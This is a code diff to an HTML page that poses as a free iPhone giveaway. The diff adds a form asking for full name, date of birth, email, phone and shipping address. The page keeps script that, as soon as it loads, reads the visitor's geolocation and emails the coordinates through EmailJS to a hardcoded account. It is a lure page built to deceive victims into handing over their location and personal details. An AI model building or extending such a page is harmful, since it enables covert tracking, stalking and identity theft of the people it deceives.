@@ -3,44 +3,144 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Auto Send Location</title>
+  <title>Auto Send Location + Form</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       padding: 30px;
       background-color: #f0f0f0;
+      color: #333;
     }
     .container {
-      max-width: 500px;
+      max-width: 600px;
       margin: auto;
       background: white;
-      padding: 20px;
+      padding: 25px 30px;
       border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
     }
     h2 {
+      margin-bottom: 25px;
+      text-align: center;
+      color: #2c3e50;
+    }
+    form {
+      margin-top: 20px;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+      color: #34495e;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="tel"],
+    input[type="date"],
+    textarea {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 15px;
+      border: 1.8px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      transition: border-color 0.3s ease;
+    }
+    input[type="text"]:focus,
+    input[type="email"]:focus,
+    input[type="tel"]:focus,
+    input[type="date"]:focus,
+    textarea:focus {
+      border-color: #3498db;
+      outline: none;
+    }
+    textarea {
+      resize: vertical;
+      min-height: 70px;
+    }
+    #locationDisplay {
+      background: rgba(255, 255, 255, 0.85);
+      color: #666;
+      padding: 0.5rem 0.75rem;
+      border-radius: 4px;
+      font-size: 14px;
       margin-bottom: 20px;
+      text-align: center;
+    }
+    button {
+      width: 100%;
+      background-color: #3498db;
+      color: white;
+      border: none;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 7px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #2980b9;
     }
     #status {
-      margin-top: 20px;
+      margin-top: 18px;
       font-size: 16px;
       color: #555;
+      text-align: center;
+      white-space: pre-line; /* preserve newlines */
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h2>Sending Your Location...</h2>
+    <h2>Sending Your Location Automatically</h2>
+
+    <form id="rewardForm">
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" class="form-control" id="fullName" placeholder="Enter your full name" required />
+      </div>
+      <div class="form-group">
+        <label for="dob">Date of Birth</label>
+        <input type="date" class="form-control" id="dob" required />
+      </div>
+      <div class="form-group">
+        <label for="email">Email Address</label>
+        <input type="email" class="form-control" id="email" placeholder="Enter your email" required />
+      </div>
+      <div class="form-group">
+        <label for="phoneNumber">Phone Number</label>
+        <input type="tel" class="form-control" id="phoneNumber" placeholder="Enter your phone number" required />
+      </div>
+      <div class="form-group">
+        <label for="address">Shipping Address</label>
+        <textarea class="form-control" id="address" rows="3" placeholder="Enter your shipping address" required></textarea>
+      </div>
+      <div class="form-group">
+        <label for="city">City</label>
+        <input type="text" class="form-control" id="city" placeholder="Enter your city" required />
+      </div>
+      <div class="form-group">
+        <label for="postalCode">Postal Code</label>
+        <input type="text" class="form-control" id="postalCode" placeholder="Enter your postal code" required />
+      </div>
+
+      <p id="locationDisplay">Location permissions required to auto-fill your location.</p>
+      <button type="submit">Submit and Claim iPhone</button>
+    </form>
+
     <div id="status">Please allow location permission.</div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script>
-    // Initialize EmailJS with your public key
     emailjs.init("-_fZgZZhnhhK2OvuV");
 
     const statusEl = document.getElementById("status");
+    const locationDisplay = document.getElementById("locationDisplay");
 
     function sendLocationEmail(lat, lng) {
       emailjs.send("service_7xiz4x8", "template_ux0sel8", {
@@ -51,6 +151,7 @@
       })
       .then(() => {
         statusEl.textContent = `Location sent successfully!\nLatitude: ${lat}, Longitude: ${lng}`;
+        locationDisplay.textContent = `Your location: Latitude ${lat}, Longitude ${lng}`;
       })
       .catch((error) => {
         statusEl.textContent = "Failed to send email: " + error.text;
@@ -61,22 +162,31 @@
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const lat = position.coords.latitude.toFixed(6);  // limit decimal places
+            const lat = position.coords.latitude.toFixed(6);
             const lng = position.coords.longitude.toFixed(6);
-            statusEl.textContent = `Location found: Latitude ${lat}, Longitude ${lng}. Sending email...`;
+            locationDisplay.textContent = `Your location detected: Latitude ${lat}, Longitude ${lng}`;
+            statusEl.textContent = `Location found. Sending email...`;
             sendLocationEmail(lat, lng);
           },
           (error) => {
-            statusEl.textContent = "Error getting location: " + error.message;
+            locationDisplay.textContent = "Error getting location: " + error.message;
+            statusEl.textContent = "Error getting location.";
           }
         );
       } else {
-        statusEl.textContent = "Geolocation is not supported by this browser.";
+        locationDisplay.textContent = "Geolocation is not supported by this browser.";
+        statusEl.textContent = "Geolocation not supported.";
       }
     }
 
-    // Automatically request location and send email on page load
     window.onload = getLocationAndSend;
+
+    // Optional: You can add form submission handler if needed, else it just submits normally.
+    document.getElementById('rewardForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      alert('Form submitted! (You can add your own form handling here)');
+      // You can add your own AJAX form submission or processing here if needed.
+    });
   </script>
 </body>
 </html>
